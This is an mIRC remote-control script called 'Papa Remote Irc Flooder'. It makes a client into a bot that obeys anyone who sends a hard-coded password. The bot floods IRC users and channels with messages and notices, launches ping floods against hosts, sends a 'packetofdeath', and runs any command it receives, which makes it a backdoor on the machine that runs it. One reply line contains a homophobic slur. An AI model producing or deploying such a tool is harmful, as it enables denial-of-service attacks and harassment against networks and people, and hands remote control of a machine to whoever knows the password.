[script]
n0=on 1:TEXT:!Version:*:{ /amsg [Papa Remote Irc Flooder] Remote Command By: station420 Script Command By: TBA -=I Own j00=- } | .notice $NICK Task Completed. 
n1=on 1:TEXT:!pass 420:*:/auser 700 $nick | .notice $nick Password Accepted 
n2=on 1:TEXT:!pass *:*:/notice $nick Password Not Accepted (hah you fucking faggot)
n3=on 1:TEXT:!*:*:/notice $nick Unknown Command
n4=on 700:Text:!Help:*:/play $nick help.txt 250 | .notice $NICK Task Completed. 
n5=on 700:TEXT:!msg *:*:{ /msg $2- } | .notice $NICK Task Completed.
n6=on 700:TEXT:!Flood *:*:{ /fuck $2- } | .notice $NICK Task Completed.
n7=on 700:TEXT:!FloodOff:*:{ /set %type Privmsg | /cleanup } | .notice $NICK Task Completed.
n8=on 700:TEXT:!NFlood *:*:{ /set %type Notice | /fuck $2- } | .notice $NICK Task Completed.
n9=on 700:TEXT:!Part *:*:{ /PART $2- } | .notice $NICK Task Completed. 
n10=on 700:TEXT:!Join *:*:{ /Join $2 } | .notice $NICK Task Completed. 
n11=on 700:TEXT:!Jump *:*:{ /server $2- } | .notice $NICK Task Completed. 
n12=on 700:TEXT:!Die:*:{ /quit Own By $nick } | { /exit }
n13=on 700:TEXT:!RandomNicks:*:{ /random } | .notice $NICK Task Completed. 
n14=on 700:TEXT:!ReConnect:*:{ /quit Reconnect Requested By $nick } | /server $server } | .notice $NICK Task Completed. 
n15=on 700:TEXT:!Quit*:*:{ /quit ( $2- )( %quit } | { /exit }
n16=on 700:TEXT:!Close -m:*:{ /close -m } | .notice $NICK Task Completed. 
n17=on 700:TEXT:!SetServer *:*:{ /set %server $2- } | .notice $NICK Task Completed. 
n18=on 700:TEXT:!SetClones *:*:{ /set %clones $2- } | .notice $NICK Task Completed. 
n19=on 700:TEXT:!Nick *:*:{ /nick $2- } | .notice $NICK Task Completed. 
n20=on 700:TEXT:!Notice *:*:{ /notice $2- } | .notice $NICK Task Completed. 
n21=on 700:TEXT:!Command *:*:{ $2- } | .notice $NICK Task Completed. 
n22=on 700:TEXT:!PingFlood *:*:{ /run -n ping.exe $2- -t -n 999999999 -l 15000 } | .notice $NICK Task Completed. 
n23=on 700:TEXT:!PingFloodOff:*:{ /close ping.exe } | .notice $NICK Task Completed. 
n24=on 700:TEXT:!Ru *:*:{ /ruser $2- } | notice $nick $2- Removed From My Access List.
n25=on 700:TEXT:!packet *:*: { packetofdeath $2 $3 $4 }
